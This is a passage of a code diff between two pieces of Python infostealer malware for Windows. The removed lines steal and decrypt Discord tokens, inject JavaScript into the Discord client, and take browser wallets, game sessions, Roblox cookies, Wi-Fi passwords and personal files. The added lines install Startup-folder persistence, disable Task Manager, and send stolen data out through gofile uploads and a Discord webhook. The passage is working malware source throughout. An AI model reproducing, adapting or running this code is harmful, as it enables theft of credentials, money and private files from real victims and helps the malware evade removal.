'Epic Privacy Browser', 'User Data'), 'Microsoft Edge': os.path.join(Discord.LOCALAPPDATA, 'Microsoft', 'Edge', 'User Data'), 'Uran': os.path.join(Discord.LOCALAPPDATA, 'uCozMedia', 'Uran', 'User Data'), 'Yandex': os.path.join(Discord.LOCALAPPDATA, 'Yandex', 'YandexBrowser', 'User Data'), 'Brave': os.path.join(Discord.LOCALAPPDATA, 'BraveSoftware', 'Brave-Browser', 'User Data'), 'Iridium': os.path.join(Discord.LOCALAPPDATA, 'Iridium', 'User Data')}
-        for name, path in paths.items():
-            if os.path.isdir(path):
-                if name == 'FireFox':
-                    t = Thread(target=lambda: tokens.extend(Discord.FireFoxSteal(path) or list()))
-                    t.start()
-                    threads.append(t)
-                else:
-                    t = Thread(target=lambda: tokens.extend(Discord.SafeStorageSteal(path) or list()))
-                    t.start()
-                    threads.append(t)
-                    t = Thread(target=lambda: tokens.extend(Discord.SimpleSteal(path) or list()))
-                    t.start()
-                    threads.append(t)
-        for thread in threads:
-            thread.join()
-        tokens = [*set(tokens)]
-        for token in tokens:
-            r: HTTPResponse = Discord.httpClient.request('GET', 'https://discord.com/api/v9/users/@me', headers=Discord.GetHeaders(token.strip()))
-            if r.status == 200:
-                r = r.data.decode(errors='ignore')
-                r = json.loads(r)
-                user = r['username'] + '#' + str(r['discriminator'])
-                id = r['id']
-                email = r['email'].strip() if r['email'] else '(No Email)'
-                phone = r['phone'] if r['phone'] else '(No Phone Number)'
-                verified = r['verified']
-                mfa = r['mfa_enabled']
-                nitro_type = r.get('premium_type', 0)
-                nitro_infos = {0: 'No Nitro', 1: 'Nitro Classic', 2: 'Nitro', 3: 'Nitro Basic'}
-                nitro_data = nitro_infos.get(nitro_type, '(Unknown)')
-                billing = json.loads(Discord.httpClient.request('GET', 'https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=Discord.GetHeaders(token)).data.decode(errors='ignore'))
-                if len(billing) == 0:
-                    billing = '(No Payment Method)'
-                else:
-                    methods = {'Card': 0, 'Paypal': 0, 'Unknown': 0}
-                    for m in billing:
-                        if not isinstance(m, dict):
-                            continue
-                        method_type = m.get('type', 0)
-                        match method_type:
-                            case 1:
-                                methods['Card'] += 1
-                            case 2:
-                                methods['Paypal'] += 1
-                            case _:
-                                methods['Unknown'] += 1
-                    billing = ', '.join(['{} ({})'.format(name, quantity) for name, quantity in methods.items() if quantity != 0]) or 'None'
-                gifts = list()
-                r = Discord.httpClient.request('GET', 'https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers=Discord.GetHeaders(token)).data.decode(errors='ignore')
-                if 'code' in r:
-                    r = json.loads(r)
-                    for i in r:
-                        if isinstance(i, dict):
-                            code = i.get('code')
-                            if i.get('promotion') is None or not isinstance(i['promotion'], dict):
-                                continue
-                            title = i['promotion'].get('outbound_title')
-                            if code and title:
-                                gifts.append(f'{title}: {code}')
-                if len(gifts) == 0:
-                    gifts = 'Gift Codes: (NONE)'
-                else:
-                    gifts = 'Gift Codes:\n\t' + '\n\t'.join(gifts)
-                results.append({'USERNAME': user, 'USERID': id, 'MFA': mfa, 'EMAIL': email, 'PHONE': phone, 'VERIFIED': verified, 'NITRO': nitro_data, 'BILLING': billing, 'TOKEN': token, 'GIFTS': gifts})
-        return results
-
-    @staticmethod
-    def SafeStorageSteal(path: str) -> list[str]:
-        encryptedTokens = list()
-        tokens = list()
-        key: str = None
-        levelDbPaths: list[str] = list()
-        localStatePath = os.path.join(path, 'Local State')
-        for root, dirs, _ in os.walk(path):
-            for dir in dirs:
-                if dir == 'leveldb':
-                    levelDbPaths.append(os.path.join(root, dir))
-        if os.path.isfile(localStatePath) and levelDbPaths:
-            with open(localStatePath, errors='ignore') as file:
-                jsonContent: dict = json.load(file)
-            key = jsonContent['os_crypt']['encrypted_key']
-            key = base64.b64decode(key)[5:]
-            for levelDbPath in levelDbPaths:
-                for file in os.listdir(levelDbPath):
-                    if file.endswith(('.log', '.ldb')):
-                        filepath = os.path.join(levelDbPath, file)
-                        with open(filepath, errors='ignore') as file:
-                            lines = file.readlines()
-                        for line in lines:
-                            if line.strip():
-                                matches: list[str] = re.findall(Discord.REGEX_ENC, line)
-                                for match in matches:
-                                    match = match.rstrip('\\')
-                                    if not match in encryptedTokens:
-                                        match = base64.b64decode(match.split('dQw4w9WgXcQ:')[1].encode())
-                                        encryptedTokens.append(match)
-        for token in encryptedTokens:
-            try:
-                token = pyaes.AESModeOfOperationGCM(Syscalls.CryptUnprotectData(key), token[3:15]).decrypt(token[15:])[:-16].decode(errors='ignore')
-                if token:
-                    tokens.append(token)
-            except Exception:
-                pass
-        return tokens
-
-    @staticmethod
-    def SimpleSteal(path: str) -> list[str]:
-        tokens = list()
-        levelDbPaths = list()
-        for root, dirs, _ in os.walk(path):
-            for dir in dirs:
-                if dir == 'leveldb':
-                    levelDbPaths.append(os.path.join(root, dir))
-        for levelDbPath in levelDbPaths:
-            for file in os.listdir(levelDbPath):
-                if file.endswith(('.log', '.ldb')):
-                    filepath = os.path.join(levelDbPath, file)
-                    with open(filepath, errors='ignore') as file:
-                        lines = file.readlines()
-                    for line in lines:
-                        if line.strip():
-                            matches: list[str] = re.findall(Discord.REGEX, line.strip())
-                            for match in matches:
-                                match = match.rstrip('\\')
-                                if not match in tokens:
-                                    tokens.append(match)
-        return tokens
-
-    @staticmethod
-    def FireFoxSteal(path: str) -> list[str]:
-        tokens = list()
-        for root, _, files in os.walk(path):
-            for file in files:
-                if file.lower().endswith('.sqlite'):
-                    filepath = os.path.join(root, file)
-                    with open(filepath, errors='ignore') as file:
-                        lines = file.readlines()
-                        for line in lines:
-                            if line.strip():
-                                matches: list[str] = re.findall(Discord.REGEX, line)
-                                for match in matches:
-                                    match = match.rstrip('\\')
-                                    if not match in tokens:
-                                        tokens.append(match)
-        return tokens
-
-    @staticmethod
-    def InjectJs() -> str | None:
-        check = False
-        try:
-            code = base64.b64decode(b'%injectionbase64encoded%').decode(errors='ignore').replace("'%WEBHOOKHEREBASE64ENCODED%'", "'{}'".format(base64.b64encode(Settings.C2[1].encode()).decode(errors='ignore')))
-        except Exception:
-            return None
-        for dirname in ('Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment'):
-            path = os.path.join(os.getenv('localappdata'), dirname)
-            if not os.path.isdir(path):
-                continue
-            for root, _, files in os.walk(path):
-                for file in files:
-                    if file.lower() == 'index.js':
-                        filepath = os.path.realpath(os.path.join(root, file))
-                        if os.path.split(os.path.dirname(filepath))[-1] == 'discord_desktop_core':
-                            with open(filepath, 'w', encoding='utf-8') as file:
-                                file.write(code)
-                            check = True
-            if check:
-                check = False
-                yield path
-
-class BlankGrabber:
-    Separator: str = None
-    TempFolder: str = None
-    ArchivePath: str = None
-    Cookies: list = []
-    PasswordsCount: int = 0
-    HistoryCount: int = 0
-    AutofillCount: int = 0
-    RobloxCookiesCount: int = 0
-    DiscordTokensCount: int = 0
-    WifiPasswordsCount: int = 0
-    MinecraftSessions: int = 0
-    WebcamPicturesCount: int = 0
-    TelegramSessionsCount: int = 0
-    CommonFilesCount: int = 0
-    WalletsCount: int = 0
-    ScreenshotTaken: bool = False
-    SystemInfoStolen: bool = False
-    SteamStolen: bool = False
-    EpicStolen: bool = False
-    UplayStolen: bool = False
-    GrowtopiaStolen: bool = False
-
-    def __init__(self) -> None:
-        self.Separator = '\n\n' + 'Blank Grabber'.center(50, '=') + '\n\n'
-        while True:
-            self.ArchivePath = os.path.join(os.getenv('temp'), Utility.GetRandomString() + '.zip')
-            if not os.path.isfile(self.ArchivePath):
-                break
-        Logger.info('Creating temporary folder')
-        while True:
-            self.TempFolder = os.path.join(os.getenv('temp'), Utility.GetRandomString(10, True))
-            if not os.path.isdir(self.TempFolder):
-                os.makedirs(self.TempFolder, exist_ok=True)
-                break
-        for func, daemon in ((self.StealBrowserData, False), (self.StealDiscordTokens, False), (self.StealTelegramSessions, False), (self.StealWallets, False), (self.StealMinecraft, False), (self.StealEpic, False), (self.StealGrowtopia, False), (self.StealSteam, False), (self.StealUplay, False), (self.GetAntivirus, False), (self.GetClipboard, False), (self.GetTaskList, False), (self.GetDirectoryTree, False), (self.GetWifiPasswords, False), (self.StealSystemInfo, False), (self.BlockSites, False), (self.TakeScreenshot, True), (self.Webshot, True), (self.StealCommonFiles, True)):
-            thread = Thread(target=func, daemon=daemon)
-            thread.start()
-            Tasks.AddTask(thread)
-        Tasks.WaitForAll()
-        Logger.info('All functions ended')
-        if Errors.errors:
-            with open(os.path.join(self.TempFolder, 'Errors.txt'), 'w', encoding='utf-8', errors='ignore') as file:
-                file.write('# This file contains the errors handled successfully during the functioning of the stealer.' + '\n\n' + '=' * 50 + '\n\n' + ('\n\n' + '=' * 50 + '\n\n').join(Errors.errors))
-        self.SendData()
-        try:
-            Logger.info('Removing archive')
-            os.remove(self.ArchivePath)
-            Logger.info('Removing temporary folder')
-            shutil.rmtree(self.TempFolder)
+            if os.path.isfile(file_path):
+                os.remove(file_path)
+            elif os.path.isdir(file_path):
+                shutil.rmtree(file_path)
         except Exception:
             pass
 
-    @Errors.Catch
-    def StealCommonFiles(self) -> None:
-        if Settings.CaptureCommonFiles:
-            for name, dir in (('Desktop', os.path.join(os.getenv('userprofile'), 'Desktop')), ('Pictures', os.path.join(os.getenv('userprofile'), 'Pictures')), ('Documents', os.path.join(os.getenv('userprofile'), 'Documents')), ('Music', os.path.join(os.getenv('userprofile'), 'Music')), ('Videos', os.path.join(os.getenv('userprofile'), 'Videos')), ('Downloads', os.path.join(os.getenv('userprofile'), 'Downloads'))):
-                if os.path.isdir(dir):
-                    file: str
-                    for file in os.listdir(dir):
-                        if os.path.isfile(os.path.join(dir, file)):
-                            if (any([x in file.lower() for x in ('secret', 'password', 'account', 'tax', 'key', 'wallet', 'backup')]) or file.endswith(('.txt', '.doc', '.docx', '.png', '.pdf', '.jpg', '.jpeg', '.csv', '.mp3', '.mp4', '.xls', '.xlsx'))) and os.path.getsize(os.path.join(dir, file)) < 2 * 1024 * 1024:
-                                try:
-                                    os.makedirs(os.path.join(self.TempFolder, 'Common Files', name), exist_ok=True)
-                                    shutil.copy(os.path.join(dir, file), os.path.join(self.TempFolder, 'Common Files', name, file))
-                                    self.CommonFilesCount += 1
-                                except Exception:
-                                    pass
+    def startup_persistence(self):
+        try:
+            src = os.path.abspath(sys.argv[0])
+            dst_dir = os.path.join(Paths().appdata_roaming, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+            dst = os.path.join(dst_dir, os.path.basename(src))
 
-    @Errors.Catch
-    def StealMinecraft(self) -> None:
-        if Settings.CaptureGames:
-            Logger.info('Stealing Minecraft related files')
-            saveToPath = os.path.join(self.TempFolder, 'Games', 'Minecraft')
-            userProfile = os.getenv('userprofile')
-            roaming = os.getenv('appdata')
-            minecraftPaths = {'Intent': os.path.join(userProfile, 'intentlauncher', 'launcherconfig'), 'Lunar': os.path.join(userProfile, '.lunarclient', 'settings', 'game', 'accounts.json'), 'TLauncher': os.path.join(roaming, '.minecraft', 'TlauncherProfiles.json'), 'Feather': os.path.join(roaming, '.feather', 'accounts.json'), 'Meteor': os.path.join(roaming, '.minecraft', 'meteor-client', 'accounts.nbt'), 'Impact': os.path.join(roaming, '.minecraft', 'Impact', 'alts.json'), 'Novoline': os.path.join(roaming, '.minectaft', 'Novoline', 'alts.novo'), 'CheatBreakers': os.path.join(roaming, '.minecraft', 'cheatbreaker_accounts.json'), 'Microsoft Store': os.path.join(roaming, '.minecraft', 'launcher_accounts_microsoft_store.json'), 'Rise': os.path.join(roaming, '.minecraft', 'Rise', 'alts.txt'), 'Rise (Intent)': os.path.join(userProfile, 'intentlauncher', 'Rise', 'alts.txt'), 'Paladium': os.path.join(roaming, 'paladium-group', 'accounts.json'), 'PolyMC': os.path.join(roaming, 'PolyMC', 'accounts.json'), 'Badlion': os.path.join(roaming, 'Badlion Client', 'accounts.json')}
-            for name, path in minecraftPaths.items():
-                if os.path.isfile(path):
-                    try:
-                        os.makedirs(os.path.join(saveToPath, name), exist_ok=True)
-                        shutil.copy(path, os.path.join(saveToPath, name, os.path.basename(path)))
-                        self.MinecraftSessions += 1
-                    except Exception:
-                        continue
+            if not os.path.exists(dst_dir):
+                os.makedirs(dst_dir)
 
-    @Errors.Catch
-    def StealGrowtopia(self) -> None:
-        if Settings.CaptureGames:
-            Logger.info('Stealing Growtopia session')
-            growtopiadirs = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu('Growtopia')] if x is not None])]
-            saveToPath = os.path.join(self.TempFolder, 'Games', 'Growtopia')
-            multiple = len(growtopiadirs) > 1
-            for index, path in enumerate(growtopiadirs):
-                targetFilePath = os.path.join(path, 'save.dat')
-                if os.path.isfile(targetFilePath):
-                    try:
-                        _saveToPath = saveToPath
-                        if multiple:
-                            _saveToPath = os.path.join(saveToPath, 'Profile %d' % (index + 1))
-                        os.makedirs(_saveToPath, exist_ok=True)
-                        shutil.copy(targetFilePath, os.path.join(_saveToPath, 'save.dat'))
-                        self.GrowtopiaStolen = True
-                    except Exception:
-                        shutil.rmtree(_saveToPath)
-            if multiple and self.GrowtopiaStolen:
-                with open(os.path.join(saveToPath, 'Info.txt'), 'w') as file:
-                    file.write('Multiple Growtopia installations are found, so the files for each of them are put in different Profiles')
+            if not os.path.exists(dst):
+                shutil.copy2(src, dst)
+        except Exception:
+            pass
 
-    @Errors.Catch
-    def StealEpic(self) -> None:
-        if Settings.CaptureGames:
-            Logger.info('Stealing Epic session')
-            saveToPath = os.path.join(self.TempFolder, 'Games', 'Epic')
-            epicPath = os.path.join(os.getenv('localappdata'), 'EpicGamesLauncher', 'Saved', 'Config', 'Windows')
-            if os.path.isdir(epicPath):
-                loginFile = os.path.join(epicPath, 'GameUserSettings.ini')
-                if os.path.isfile(loginFile):
-                    with open(loginFile) as file:
-                        contents = file.read()
-                    if '[RememberMe]' in contents:
-                        try:
-                            os.makedirs(saveToPath, exist_ok=True)
-                            for file in os.listdir(epicPath):
-                                if os.path.isfile(os.path.join(epicPath, file)):
-                                    shutil.copy(os.path.join(epicPath, file), os.path.join(saveToPath, file))
-                            shutil.copytree(epicPath, saveToPath, dirs_exist_ok=True)
-                            self.EpicStolen = True
-                        except Exception:
-                            pass
+    def block_task_manager(self):
+        try:
+            key = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
+            registry = ctypes.windll.advapi32.RegCreateKeyExW
+            hkey = ctypes.c_void_p()
+            result = registry(ctypes.c_void_p(0x80000002), key, 0, None, 0, 0xF003F, None, ctypes.byref(hkey), None)
+            if result == 0:
+                value = ctypes.c_uint32(1)
+                ctypes.windll.advapi32.RegSetValueExW(hkey, "DisableTaskMgr", 0, 4, ctypes.byref(value), 4)
+                ctypes.windll.advapi32.RegCloseKey(hkey)
+        except Exception:
+            pass
 
-    @Errors.Catch
-    def StealSteam(self) -> None:
-        if Settings.CaptureGames:
-            Logger.info('Stealing Steam session')
-            saveToPath = os.path.join(self.TempFolder, 'Games', 'Steam')
-            steamPaths = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu('Steam')] if x is not None])]
-            multiple = len(steamPaths) > 1
-            if not steamPaths:
-                steamPaths.append('C:\\Program Files (x86)\\Steam')
-            for index, steamPath in enumerate(steamPaths):
-                steamConfigPath = os.path.join(steamPath, 'config')
-                if os.path.isdir(steamConfigPath):
-                    loginFile = os.path.join(steamConfigPath, 'loginusers.vdf')
-                    if os.path.isfile(loginFile):
-                        with open(loginFile) as file:
-                            contents = file.read()
-                        if '"RememberPassword"\t\t"1"' in contents:
-                            try:
-                                _saveToPath = saveToPath
-                                if multiple:
-                                    _saveToPath = os.path.join(saveToPath, 'Profile %d' % (index + 1))
-                                os.makedirs(_saveToPath, exist_ok=True)
-                                shutil.copytree(steamConfigPath, os.path.join(_saveToPath, 'config'), dirs_exist_ok=True)
-                                for item in os.listdir(steamPath):
-                                    if item.startswith('ssfn') and os.path.isfile(os.path.join(steamPath, item)):
-                                        shutil.copy(os.path.join(steamPath, item), os.path.join(_saveToPath, item))
-                                        self.SteamStolen = True
-                            except Exception:
-                                pass
-            if self.SteamStolen and multiple:
-                with open(os.path.join(saveToPath, 'Info.txt'), 'w') as file:
-                    file.write('Multiple Steam installations are found, so the files for each of them are put in different Profiles')
+    def unblock_task_manager(self):
+        try:
+            key = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
+            registry = ctypes.windll.advapi32.RegCreateKeyExW
+            hkey = ctypes.c_void_p()
+            result = registry(ctypes.c_void_p(0x80000002), key, 0, None, 0, 0xF003F, None, ctypes.byref(hkey), None)
+            if result == 0:
+                value = ctypes.c_uint32(0)
+                ctypes.windll.advapi32.RegSetValueExW(hkey, "DisableTaskMgr", 0, 4, ctypes.byref(value), 4)
+                ctypes.windll.advapi32.RegCloseKey(hkey)
+        except Exception:
+            pass
 
-    @Errors.Catch
-    def StealUplay(self) -> None:
-        if Settings.CaptureGames:
-            Logger.info('Stealing Uplay session')
-            saveToPath = os.path.join(self.TempFolder, 'Games', 'Uplay')
-            uplayPath = os.path.join(os.getenv('localappdata'), 'Ubisoft Game Launcher')
-            if os.path.isdir(uplayPath):
-                for item in os.listdir(uplayPath):
-                    if os.path.isfile(os.path.join(uplayPath, item)):
-                        os.makedirs(saveToPath, exist_ok=True)
-                        shutil.copy(os.path.join(uplayPath, item), os.path.join(saveToPath, item))
-                        self.UplayStolen = True
+    def send_webhook(self, gofile_url=None, file_path=None):
+        try:
+            embed = {
+                "title": "• Basit sistem bilgileri:",
+                "color": 0xE53935,
+                "fields": [
+                    {"name": "Ana makine adı:", "value": f"```{socket.gethostname()}```", "inline": True},
+                    {"name": "İsim:", "value": f"```{getpass.getuser()}```", "inline": True},
+                    {"name": "Makine:", "value": f"```{platform.machine()}```", "inline": True},
+                    {"name": "Sistem:", "value": f"```{platform.system()}```", "inline": True},
+                    {"name": "Sürüm:", "value": f"```{platform.release()}```", "inline": True},
+                    {"name": "Versiyon:", "value": f"```{platform.version()}```", "inline": True},
+                ],
+                "footer": {
+                    "text": "• Im returning by death. | @Croxlv"
+                }
+            }
 
-    @Errors.Catch
-    def StealRobloxCookies(self) -> None:
-        if Settings.CaptureGames:
-            Logger.info('Stealing Roblox cookies')
-            saveToDir = os.path.join(self.TempFolder, 'Games', 'Roblox')
-            note = '# The cookies found in this text file have not been verified online. \n# Therefore, there is a possibility that some of them may work, while others may not.'
-            cookies = []
-            browserCookies = '\n'.join(self.Cookies)
-            for match in re.findall('_\\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\\.\\|_[A-Z0-9]+', browserCookies):
-                cookies.append(match)
-            output = list()
-            for item in ('HKCU', 'HKLM'):
-                process = subprocess.run('powershell Get-ItemPropertyValue -Path {}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY'.format(item), capture_output=True, shell=True)
-                if not process.returncode:
-                    output.append(process.stdout.decode(errors='ignore'))
-            for match in re.findall('_\\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\\.\\|_[A-Z0-9]+', '\n'.join(output)):
-                cookies.append(match)
-            cookies = [*set(cookies)]
-            if cookies:
-                os.makedirs(saveToDir, exist_ok=True)
-                with open(os.path.join(saveToDir, 'Roblox Cookies.txt'), 'w') as file:
-                    file.write('{}{}{}'.format(note, self.Separator, self.Separator.join(cookies)))
-                self.RobloxCookiesCount += len(cookies)
+            components = [
+                {
+                    "type": 1,
+                    "components": [
+                        {
+                            "type": 2,              
+                            "style": 5,                    
+                            "label": "Dosya İndir",       
+                            "url": gofile_url        
+                        },
+                        {
+                            "type": 2,              
+                            "style": 5,                    
+                            "label": "Github",       
+                            "url": "https://github.com/Croxlv"        
+                        }
+                    ]
+                }
+            ]
 
-    @Errors.Catch
-    def StealWallets(self) -> None:
-        if Settings.CaptureWallets:
-            Logger.info('Stealing crypto wallets')
-            saveToDir = os.path.join(self.TempFolder, 'Wallets')
-            wallets = (('Zcash', os.path.join(os.getenv('appdata'), 'Zcash')), ('Armory', os.path.join(os.getenv('appdata'), 'Armory')), ('Bytecoin', os.path.join(os.getenv('appdata'), 'Bytecoin')), ('Jaxx', os.path.join(os.getenv('appdata'), 'com.liberty.jaxx', 'IndexedDB', 'file_0.indexeddb.leveldb')), ('Exodus', os.path.join(os.getenv('appdata'), 'Exodus', 'exodus.wallet')), ('Ethereum', os.path.join(os.getenv('appdata'), 'Ethereum', 'keystore')), ('Electrum', os.path.join(os.getenv('appdata'), 'Electrum', 'wallets')), ('AtomicWallet', os.path.join(os.getenv('appdata'), 'atomic', 'Local Storage', 'leveldb')), ('Guarda', os.path.join(os.getenv('appdata'), 'Guarda', 'Local Storage', 'leveldb')), ('Coinomi', os.path.join(os.getenv('localappdata'), 'Coinomi', 'Coinomi', 'wallets')))
-            browserPaths = {'Brave': os.path.join(os.getenv('localappdata'), 'BraveSoftware', 'Brave-Browser', 'User Data'), 'Chrome': os.path.join(os.getenv('localappdata'), 'Google', 'Chrome', 'User Data'), 'Chromium': os.path.join(os.getenv('localappdata'), 'Chromium', 'User Data'), 'Comodo': os.path.join(os.getenv('localappdata'), 'Comodo', 'Dragon', 'User Data'), 'Edge': os.path.join(os.getenv('localappdata'), 'Microsoft', 'Edge', 'User Data'), 'EpicPrivacy': os.path.join(os.getenv('localappdata'), 'Epic Privacy Browser', 'User Data'), 'Iridium': os.path.join(os.getenv('localappdata'), 'Iridium', 'User Data'), 'Opera': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera Stable'), 'Opera GX': os.path.join(os.getenv('appdata'), 'Opera Software', 'Opera GX Stable'), 'Slimjet': os.path.join(os.getenv('localappdata'), 'Slimjet', 'User Data'), 'UR': os.path.join(os.getenv('localappdata'), 'UR Browser', 'User Data'), 'Vivaldi': os.path.join(os.getenv('localappdata'), 'Vivaldi', 'User Data'), 'Yandex': os.path.join(os.getenv('localappdata'), 'Yandex', 'YandexBrowser', 'User Data')}
-            for name, path in wallets:
-                if os.path.isdir(path):
-                    _saveToDir = os.path.join(saveToDir, name)
-                    os.makedirs(_saveToDir, exist_ok=True)
-                    try:
-                        shutil.copytree(path, os.path.join(_saveToDir, os.path.basename(path)), dirs_exist_ok=True)
-                        with open(os.path.join(_saveToDir, 'Location.txt'), 'w') as file:
-                            file.write(path)
-                        self.WalletsCount += 1
-                    except Exception:
-                        try:
-                            shutil.rmtree(_saveToDir)
-                        except Exception:
-                            pass
-            for name, path in browserPaths.items():
-                if os.path.isdir(path):
-                    for root, dirs, _ in os.walk(path):
-                        for _dir in dirs:
-                            if _dir == 'Local Extension Settings':
-                                localExtensionsSettingsDir = os.path.join(root, _dir)
-                                for _dir in ('ejbalbakoplchlghecdalmeeeajnimhm', 'nkbihfbeogaeaoehlefnkodbefgpgknn'):
-                                    extentionPath = os.path.join(localExtensionsSettingsDir, _dir)
-                                    if os.path.isdir(extentionPath) and os.listdir(extentionPath):
-                                        try:
-                                            metamask_browser = os.path.join(saveToDir, 'Metamask ({})'.format(name))
-                                            _saveToDir = os.path.join(metamask_browser, _dir)
-                                            shutil.copytree(extentionPath, _saveToDir, dirs_exist_ok=True)
-                                            with open(os.path.join(_saveToDir, 'Location.txt'), 'w') as file:
-                                                file.write(extentionPath)
-                                            self.WalletsCount += 1
-                                        except Exception:
-                                            try:
-                                                shutil.rmtree(_saveToDir)
-                                                if not os.listdir(metamask_browser):
-                                                    shutil.rmtree(metamask_browser)
-                                            except Exception:
-                                                pass
+            payload = {
+                "username": self.malware_name,
+                "embeds": [embed],
+                "components": components
+            }
 
-    @Errors.Catch
-    def StealSystemInfo(self) -> None:
-        if Settings.CaptureSystemInfo:
-            Logger.info('Stealing system information')
-            saveToDir = os.path.join(self.TempFolder, 'System')
-            process = subprocess.run('systeminfo', capture_output=True, shell=True)
-            output = process.stdout.decode(errors='ignore').strip().replace('\r\n', '\n')
-            if output:
-                os.makedirs(saveToDir, exist_ok=True)
-                with open(os.path.join(saveToDir, 'System Info.txt'), 'w') as file:
-                    file.write(output)
-                self.SystemInfoStolen = True
-            process = subprocess.run('getmac', capture_output=True, shell=True)
-            output = process.stdout.decode(errors='ignore').strip().replace('\r\n', '\n')
-            if output:
-                os.makedirs(saveToDir, exist_ok=True)
-                with open(os.path.join(saveToDir, 'MAC Addresses.txt'), 'w') as file:
-                    file.write(output)
-                self.SystemInfoStolen = True
+            if file_path and os.path.exists(file_path):
+                with open(file_path, "rb") as f:
+                    files = {"file": (os.path.basename(file_path), f)}
+                    requests.post(self.webhook_url + "?with_components=true", data={"payload_json": json.dumps(payload)}, files=files)
+            else:
+                requests.post(self.webhook_url + "?with_components=true", json=payload)
 
-    @Errors.Catch
-    def GetDirectoryTree(self) -> None:
-        if Settings.CaptureSystemInfo:
-            Logger.info('Getting directory trees')
-            PIPE = chr(9474) + '   '
-            TEE = ''.join((chr(x) for x in (9500, 9472, 9472))) + ' '
-            ELBOW = ''.join((chr(x) for x in (9492, 9472, 9472))) + ' '
-            output = {}
-            for name, dir in (('Desktop', os.path.join(os.getenv('userprofile'), 'Desktop')), ('Pictures', os.path.join(os.getenv('userprofile'), 'Pictures')), ('Documents', os.path.join(os.getenv('userprofile'), 'Documents')), ('Music', os.path.join(os.getenv('userprofile'), 'Music')), ('Videos', os.path.join(os.getenv('userprofile'), 'Videos')), ('Downloads', os.path.join(os.getenv('userprofile'), 'Downloads'))):
-                if os.path.isdir(dir):
-                    dircontent: list = os.listdir(dir)
-                    if 'desltop.ini' in dircontent:
-                        dircontent.remove('desktop.ini')
-                    if dircontent:
-                        process = subprocess.run('tree /A /F', shell=True, capture_output=True, cwd=dir)
-                        if process.returncode == 0:
-                            output[name] = (name + '\n' + '\n'.join(process.stdout.decode(errors='ignore').splitlines()[3:])).replace('|   ', PIPE).replace('+---', TEE).replace('\\---', ELBOW)
-            for key, value in output.items():
-                os.makedirs(os.path.join(self.TempFolder, 'Directories'), exist_ok=True)
-                with open(os.path.join(self.TempFolder, 'Directories', '{}.txt'.format(key)), 'w', encoding='utf-8') as file:
-                    file.write(value)
-                self.SystemInfoStolen = True
+        except Exception as e:
+            print("Erro:", e)
 
-    @Errors.Catch
-    def GetClipboard(self) -> None:
-        if Settings.CaptureSystemInfo:
-            Logger.info('Getting clipboard text')
-            saveToDir = os.path.join(self.TempFolder, 'System')
-            process = subprocess.run('powershell Get-Clipboard', shell=True, capture_output=True)
-            if process.returncode == 0:
-                content = process.stdout.decode(errors='ignore').strip()
-                if content:
-                    os.makedirs(saveToDir, exist_ok=True)
-                    with open(os.path.join(saveToDir, 'Clipboard.txt'), 'w', encoding='utf-8') as file:
-                        file.write(content)
+    def upload_gofile(self, file_path):
+        try:
+            with open(file_path, "rb") as f:
+                files = {"file": f}
+                response = requests.post(f"https://upload.gofile.io/uploadFile", files=files)
+                if response.status_code == 200:
+                    result = response.json()
+                    if result.get("status") == "ok":
+                        return result["data"]["downloadPage"]
+            return None
+        except Exception as e:
+            return None
 
-    @Errors.Catch
-    def GetAntivirus(self) -> None:
-        if Settings.CaptureSystemInfo:
-            Logger.info('Getting antivirus')
-            saveToDir = os.path.join(self.TempFolder, 'System')
-            process = subprocess.run('WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName', shell=True, capture_output=True)
-            if process.returncode == 0:
-                output = process.stdout.decode(errors='ignore').strip().replace('\r\n', '\n').splitlines()
-                if len(output) >= 2:
-                    output = output[1:]
-                    os.makedirs(saveToDir, exist_ok=True)
-                    with open(os.path.join(saveToDir, 'Antivirus.txt'), 'w', encoding='utf-8', errors='ignore') as file:
-                        file.write('\n'.join(output))
-
-    @Errors.Catch
-    def GetTaskList(self) -> None:
-        if Settings.CaptureSystemInfo:
-            Logger.info('Getting task list')
-            saveToDir = os.path.join(self.TempFolder, 'System')
-            process = subprocess.run('tasklist /FO LIST', capture_output=True, shell=True)
-            output = process.stdout.decode(errors='ignore').strip().replace('\r\n', '\n')
-            if output:
-                os.makedirs(saveToDir, exist_ok=True)
-                with open(os.path.join(saveToDir, 'Task List.txt'), 'w', errors='ignore') as tasklist:
-                    tasklist.write(output)
-
-    @Errors.Catch
-    def GetWifiPasswords(self) -> None:
-        if Settings.CaptureWifiPasswords:
-            Logger.info('Getting wifi passwords')
-            saveToDir = os.path.join(self.TempFolder, 'System')
-            passwords = Utility.GetWifiPasswords()
-            profiles = list()
-            for profile, psw in passwords.items():
-                profiles.append(f'Network: {profile}\nPassword: {psw}')
-            if profiles:
-                os.makedirs(saveToDir, exist_ok=True)
-                with open(os.path.join(saveToDir, 'Wifi Networks.txt'), 'w', encoding='utf-8', errors='ignore') as file:
-                    file.write(self.Separator.lstrip() + self.Separator.join(profiles))
-                self.WifiPasswordsCount += len(profiles)
-
-    @Errors.Catch
-    def TakeScreenshot(self) -> None:
-        if Settings.CaptureScreenshot:
-            Logger.info('Taking screenshot')
